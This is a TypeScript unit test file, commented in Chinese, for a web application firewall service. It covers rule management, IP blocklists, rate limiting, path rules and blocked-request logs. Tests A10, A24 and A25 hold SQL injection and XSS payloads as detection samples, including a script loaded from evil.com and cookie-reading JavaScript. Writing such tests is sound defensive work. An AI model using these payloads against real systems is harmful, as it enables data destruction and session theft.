/**
 * waf.service.spec.ts — V23 WAF Service 纯函数式单元测试
 *
 * 覆盖：WAFService 全部公开方法
 *   - addRule: 正例（返回含 ID）/ 边界（批量添加）
 *   - updateRule: 正例 / 反例（不存在）
 *   - deleteRule: 正例 / 反例（不存在）
 *   - listRules: 正例（排序）/ 边界（空）
 *   - evaluate: 正例（IP黑名单/SQLi body/XSS body/rate limit超限/
 *                路径黑名单/敏感路径 log/无匹配放行）
 *   - evaluate IP条件: 正例（equals 多IP/contains/regex）/ 边界（无IP）
 *   - evaluate Body条件: 正例（SQL注入/XSS）/ 边界（空body）
 *   - initBuiltInRules: 正例（含规则计数）
 *   - getBlockedLogs: 正例（日志收集）/ 边界（limit截断/空日志）
 *
 * 策略：直接 new WAFService，纯函数内联，不依赖 NestJS DI。
 */

import { describe, it, expect, beforeEach } from 'vitest'
import { WAFService, type WAFRule, type WAFDecision } from './waf.service'

// ═══════════════════════════════════════════════════════════════
// 辅助函数
// ═══════════════════════════════════════════════════════════════

function makeRule(overrides?: Partial<Omit<WAFRule, 'id'>>): Omit<WAFRule, 'id'> {
  return {
    name: overrides?.name ?? 'test-rule',
    condition: overrides?.condition ?? { type: 'ip', operator: 'equals', value: '10.0.0.1' },
    action: overrides?.action ?? 'block',
    priority: overrides?.priority ?? 50,
    enabled: overrides?.enabled ?? true,
  }
}

function makeService(): WAFService {
  return new WAFService()
}

// ═══════════════════════════════════════════════════════════════
// 规则管理
// ═══════════════════════════════════════════════════════════════

describe('WAFService — 规则管理', () => {
  let svc: WAFService

  beforeEach(() => { svc = makeService() })

  it('[A1] addRule 返回完整规则含自动ID', () => {
    const rule = svc.addRule(makeRule({ name: 'block-ip', condition: { type: 'ip', operator: 'equals', value: '1.2.3.4' } }))
    expect(rule.id).toMatch(/^rule-\d+-[a-z0-9]+$/)
    expect(rule.name).toBe('block-ip')
    expect(rule.action).toBe('block')
    expect(rule.priority).toBe(50)
    expect(rule.enabled).toBe(true)
  })

  it('[A2] addRule 多条规则 ID 唯一', () => {
    const r1 = svc.addRule(makeRule({ name: 'r1' }))
    const r2 = svc.addRule(makeRule({ name: 'r2' }))
    expect(r1.id).not.toBe(r2.id)
  })

  it('[A3] updateRule 更新字段', () => {
    const rule = svc.addRule(makeRule({ name: 'original', priority: 10, enabled: true }))
    const updated = svc.updateRule(rule.id, { name: 'updated', priority: 99, enabled: false })
    expect(updated.name).toBe('updated')
    expect(updated.priority).toBe(99)
    expect(updated.enabled).toBe(false)
  })

  it('[A4] updateRule 不存在抛出异常', () => {
    expect(() => svc.updateRule('nonexistent', { name: 'x' })).toThrow('Rule with id nonexistent not found')
  })

  it('[A5] deleteRule 删除规则', () => {
    const rule = svc.addRule(makeRule({ name: 'to-delete' }))
    expect(() => svc.deleteRule(rule.id)).not.toThrow()
    expect(svc.listRules().find(r => r.id === rule.id)).toBeUndefined()
  })

  it('[A6] deleteRule 不存在抛出异常', () => {
    expect(() => svc.deleteRule('fake-id')).toThrow('Rule with id fake-id not found')
  })

  it('[A7] listRules 按优先级升序排列', () => {
    const r1 = svc.addRule(makeRule({ name: 'high', priority: 10, condition: { type: 'ip', operator: 'equals', value: '66.66.66.66' } }))
    const r2 = svc.addRule(makeRule({ name: 'low', priority: 200, condition: { type: 'ip', operator: 'equals', value: '77.77.77.77' } }))
    const r3 = svc.addRule(makeRule({ name: 'mid', priority: 50, condition: { type: 'ip', operator: 'equals', value: '88.88.88.88' } }))
    const list = svc.listRules()
    // 查找这三个规则在列表中的位置
    const idx1 = list.findIndex(r => r.id === r1.id)
    const idx2 = list.findIndex(r => r.id === r2.id)
    const idx3 = list.findIndex(r => r.id === r3.id)
    expect(idx1).toBeLessThan(idx3)
    expect(idx3).toBeLessThan(idx2)
  })

  it('[A8] initBuiltInRules 内置规则计数', () => {
    // WAFService 构造函数已调用 initBuiltInRules
    const rules = svc.listRules()
    // 内置：1条IP黑名单 + 20条SQLi + ~76条XSS + 1条rate limit + 1条路径 + 1条敏感路径 = ~100
    expect(rules.length).toBeGreaterThan(5)
  })
})

// ═══════════════════════════════════════════════════════════════
// evaluate: 请求检查
// ═══════════════════════════════════════════════════════════════

describe('WAFService — 请求检查 (evaluate)', () => {
  let svc: WAFService

  beforeEach(() => { svc = makeService() })

  it('[A9] evaluate 命中 IP 黑名单阻止', () => {
    const decision = svc.evaluate({ ip: '192.168.100.100', path: '/api/test', method: 'GET' })
    expect(decision.allowed).toBe(false)
    expect(decision.action).toBe('block')
    expect(decision.riskLevel).toBe('malicious')
    expect(decision.reason).toContain('Block Known Malicious IPs')
  })

  it('[A10] evaluate 命中 SQLi body 阻止', () => {
    const decision = svc.evaluate({ ip: '1.2.3.4', path: '/api/login', method: 'POST', body: "SELECT * FROM users WHERE id = 1; DROP TABLE users;--" })
    expect(decision.allowed).toBe(false)
    expect(decision.action).toBe('block')
    expect(decision.riskLevel).toBe('malicious')
  })

  it('[A11] evaluate 命中 XSS body 阻止', () => {
    const decision = svc.evaluate({ ip: '1.2.3.4', path: '/api/comment', method: 'POST', body: '<script>alert("xss")</script>' })
    expect(decision.allowed).toBe(false)
    expect(decision.action).toBe('block')
  })

  it('[A12] evaluate rate limit 超限阻止', () => {
    // 快速发送 101 次请求模拟超限
    const ip = '10.20.30.40'
    let lastDecision: WAFDecision = { allowed: true, reason: '', riskLevel: 'safe' }
    for (let i = 0; i <= 101; i++) {
      lastDecision = svc.evaluate({ ip, path: '/api/test', method: 'GET' })
    }
    expect(lastDecision.allowed).toBe(false)
    expect(lastDecision.action).toBe('block')
    expect(lastDecision.reason).toContain('Rate Limiting')
  })

  it('[A13] evaluate 路径黑名单阻止', () => {
    const decision = svc.evaluate({ ip: '1.2.3.4', path: '/admin/config/db', method: 'GET' })
    expect(decision.allowed).toBe(false)
    expect(decision.reason).toContain('Block Admin Paths')
  })

  it('[A14] evaluate 敏感路径 log 不阻止', () => {
    const decision = svc.evaluate({ ip: '1.2.3.4', path: '/.env', method: 'GET' })
    expect(decision.allowed).toBe(true) // log 规则不阻止
    expect(decision.action).toBe('log')
    expect(decision.riskLevel).toBe('suspicious')
    expect(decision.matchedRule).toBeDefined()
    expect(decision.matchedRule!.name).toContain('Log Sensitive Paths')
  })

  it('[A15] evaluate 无匹配规则通过', () => {
    const decision = svc.evaluate({ ip: '9.9.9.9', path: '/api/public/health', method: 'GET', body: '{"ok": true}' })
    expect(decision.allowed).toBe(true)
    expect(decision.riskLevel).toBe('safe')
    expect(decision.reason).toContain('passed all WAF rules')
  })

  it('[A16] evaluate 多个 IP 黑名单支持', () => {
    const d1 = svc.evaluate({ ip: '172.16.0.50', path: '/api/test', method: 'GET' })
    expect(d1.allowed).toBe(false)
    const d2 = svc.evaluate({ ip: '192.168.1.100', path: '/api/test', method: 'GET' })
    expect(d2.allowed).toBe(false)
  })
})

// ═══════════════════════════════════════════════════════════════
// evaluate: 边界条件
// ═══════════════════════════════════════════════════════════════

describe('WAFService — evaluate 边界', () => {
  let svc: WAFService

  beforeEach(() => { svc = makeService() })

  it('[A17] evaluate 无 IP 不匹配 IP 规则', () => {
    const decision = svc.evaluate({ path: '/api/test' })
    expect(decision.allowed).toBe(true)
  })

  it('[A18] evaluate 无 body 不匹配 body 规则', () => {
    const decision = svc.evaluate({ ip: '1.2.3.4', path: '/api/test', method: 'POST' })
    expect(decision.allowed).toBe(true)
  })

  it('[A19] evaluate 自定义 allow 规则通过', () => {
    svc.addRule(makeRule({ name: 'allow-test', condition: { type: 'ip', operator: 'equals', value: '5.5.5.5' }, action: 'allow', priority: 1 }))
    const decision = svc.evaluate({ ip: '5.5.5.5', path: '/blacklisted-path', method: 'GET' })
    expect(decision.allowed).toBe(true)
    expect(decision.action).toBe('allow')
  })

  it('[A20] evaluate 自定义 challenge 规则', () => {
    svc.addRule(makeRule({ name: 'challenge-bot', condition: { type: 'ip', operator: 'equals', value: '6.6.6.6' }, action: 'challenge', priority: 5 }))
    const decision = svc.evaluate({ ip: '6.6.6.6', path: '/api/test', method: 'GET' })
    expect(decision.allowed).toBe(false)
    expect(decision.action).toBe('challenge')
    expect(decision.riskLevel).toBe('suspicious')
  })

  it('[A21] evaluate IP regex 条件', () => {
    svc.addRule(makeRule({ name: 'regex-block', condition: { type: 'ip', operator: 'regex', value: '^10\\.20\\..*' }, action: 'block', priority: 1 }))
    const d1 = svc.evaluate({ ip: '10.20.1.1', path: '/api/test', method: 'GET' })
    expect(d1.allowed).toBe(false)
    const d2 = svc.evaluate({ ip: '10.21.1.1', path: '/api/test', method: 'GET' })
    expect(d2.allowed).toBe(true)
  })

  it('[A22] evaluate 禁用规则不生效', () => {
    svc.addRule(makeRule({ name: 'disabled-rule', condition: { type: 'ip', operator: 'equals', value: '7.7.7.7' }, action: 'block', priority: 1, enabled: false }))
    const decision = svc.evaluate({ ip: '7.7.7.7', path: '/api/test', method: 'GET' })
    expect(decision.allowed).toBe(true)
  })

  it('[A23] evaluate rate limit 窗口重置', () => {
    const ip = '100.100.100.100'
    // 发送 150 次确保触发率限制
    let last: WAFDecision = { allowed: true, reason: '', riskLevel: 'safe' }
    for (let i = 0; i < 150; i++) {
      last = svc.evaluate({ ip, path: '/api/test', method: 'GET' })
    }
    expect(last.allowed).toBe(false)
  })

  it('[A24] evaluate 多种 SQLi 注入模式', () => {
    const payloads = [
      "' OR '1'='1",
      "'; DROP TABLE users --",
      "admin'--",
      "EXEC xp_cmdshell",
      "UNION SELECT * FROM users",
      "DELETE FROM users",
      "1; DROP TABLE users",
      "/*comment*/ UNION SELECT",
    ]
    for (const body of payloads) {
      const decision = svc.evaluate({ ip: '1.2.3.4', path: '/api/query', method: 'POST', body })
      expect(decision.allowed).toBe(false)
    }
  })

  it('[A25] evaluate 多种 XSS 注入模式', () => {
    const payloads = [
      '<script src="http://evil.com/xss.js"></script>',
      '<img onerror=alert(1) src=x>',
      '<svg onload=alert(1)>',
      '<iframe src="http://evil.com"></iframe>',
      'javascript:alert(document.cookie)',
    ]
    for (const body of payloads) {
      const decision = svc.evaluate({ ip: '1.2.3.4', path: '/api/xss-test', method: 'POST', body })
      expect(decision.allowed).toBe(false)
    }
  })
})

// ═══════════════════════════════════════════════════════════════
// 日志
// ═══════════════════════════════════════════════════════════════

describe('WAFService — 阻止日志', () => {
  let svc: WAFService

  beforeEach(() => { svc = makeService() })

  it('[A26] getBlockedLogs 空状态返回空', () => {
    const logs = svc.getBlockedLogs()
    expect(logs).toEqual([])
  })

  it('[A27] getBlockedLogs 记录阻止的请求', () => {
    svc.evaluate({ ip: '192.168.100.100', path: '/api/test', method: 'GET' })
    const logs = svc.getBlockedLogs()
    expect(logs.length).toBeGreaterThanOrEqual(1)
    expect(logs[0].allowed).toBe(false)
    expect(logs[0].action).toBe('block')
  })

  it('[A28] getBlockedLogs 不记录通过请求', () => {
    svc.evaluate({ ip: '9.9.9.9', path: '/api/public', method: 'GET' })
    const logs = svc.getBlockedLogs()
    expect(logs).toEqual([])
  })

  it('[A29] getBlockedLogs limit 截断', () => {
    // 触发多次阻止
    for (let i = 0; i < 10; i++) {
      svc.evaluate({ ip: '192.168.100.100', path: '/api/test', method: 'GET' })
    }
    const logs = svc.getBlockedLogs(3)
    expect(logs.length).toBe(3)
  })

  it('[A30] getBlockedLogs limit 超大返回全部', () => {
    svc.evaluate({ ip: '192.168.100.100', path: '/api/test', method: 'GET' })
    const logs = svc.getBlockedLogs(9999)
    expect(logs.length).toBeGreaterThanOrEqual(1)
  })
})
